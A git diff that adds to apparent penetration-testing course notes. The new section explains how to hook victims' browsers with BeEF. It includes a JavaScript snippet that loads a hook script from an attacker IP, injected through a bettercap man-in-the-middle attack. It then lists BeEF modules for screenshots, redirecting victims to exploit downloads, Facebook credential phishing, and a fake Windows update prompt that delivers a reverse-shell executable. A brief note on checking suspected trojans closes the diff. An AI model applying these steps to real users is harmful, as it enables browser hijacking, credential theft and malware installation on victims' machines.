@@ -1087,7 +1087,43 @@ $ msfconsole
   access hackers ip address from victim's browser
   ```
 
-  - Command tab that will be used to execute beef commands
-  - xxRays shows XSS vulnerability
+- Command tab that will be used to execute beef commands
+- xxRays shows XSS vulnerability
 
 ## BeEF : Hooking Targets with Bettercap
+
+- keep beef running
+- create inject_beef.js with following code
+
+```js
+var imported = document.createElement('script');
+imported.src = 'http://YourIP:3000/hook.js';
+document.head.appendChild(imported);
+```
+
+- update yourIP
+- use script to perform javascript injection attack (update in hstshijack)
+- in hstshijack.cap
+  - set hstshijack.payloads   *:/full_path_of_of_inject_beef.js
+- perform MITM with hstshijack and inject js using bettercap
+- **BeEF : Running basic commands on target**
+- search or lookup commands in Commands tab in beef
+- Raw JavaScript: runs any javascript code
+- SpyderEye : screenshot of target computer
+- Redirect Browser : redirect to your machine to download exploits
+- ***Social Enginneering Plugins > Pretty Theft > Facebook***
+
+## BeEF : Hacking Windows 10 using Fake update prompt
+
+- Command > Social Engineering > Fake Notification Bar (Browser)
+- GIVE PLUGIN URL : yourIP/file_path.exe
+- Notification message
+- Execute
+- Start Listening on port exploit will make reverse connection on
+
+## Analysing trojans
+
+- Check properties of the file. (jpg, pdf etc)
+- Is it what it seems to be?
+- Run the file in a virtual machine and check resources.
+- Use an online Sandbox service. > <https://www.hybrid-analysis.com/>
